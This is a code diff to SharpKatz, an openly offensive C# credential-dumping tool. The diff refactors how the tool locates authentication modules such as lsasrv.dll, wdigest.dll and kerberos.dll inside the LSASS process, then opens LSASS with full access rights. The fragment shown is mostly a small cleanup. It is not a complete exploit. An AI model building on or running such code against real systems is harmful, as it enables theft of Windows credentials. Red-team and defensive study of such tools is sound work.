@@ -1,4 +1,4 @@
-﻿//
+//
 // Author: B4rtik (@b4rtik)
 // Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
 // License: BSD 3-Clause
@@ -11,6 +11,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.DirectoryServices;
+using System.Globalization;
 
 namespace SharpKatz
 {
@@ -115,32 +116,33 @@ namespace SharpKatz
 
                 for (int i = 0; i < processModules.Count && modulefound < 5; i++)
                 {
-                    if (processModules[i].ModuleName.ToLower().Contains("lsasrv.dll"))
+                    string lower = processModules[i].ModuleName.ToLowerInvariant();
+
+                    if (lower.Contains("lsasrv.dll"))
                     {
                         lsasrv = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("wdigest.dll"))
+                    else if (lower.Contains("wdigest.dll"))
                     {
                         wdigest = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("msv1_0.dll"))
+                    else if (lower.Contains("msv1_0.dll"))
                     {
                         lsassmsv1 = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("kerberos.dll"))
+                    else if (lower.Contains("kerberos.dll"))
                     {
                         kerberos = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("tspkg.dll"))
+                    else if (lower.Contains("tspkg.dll"))
                     {
                         tspkg = processModules[i].BaseAddress;
                         modulefound++;
                     }
-
                 }
 
                 hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
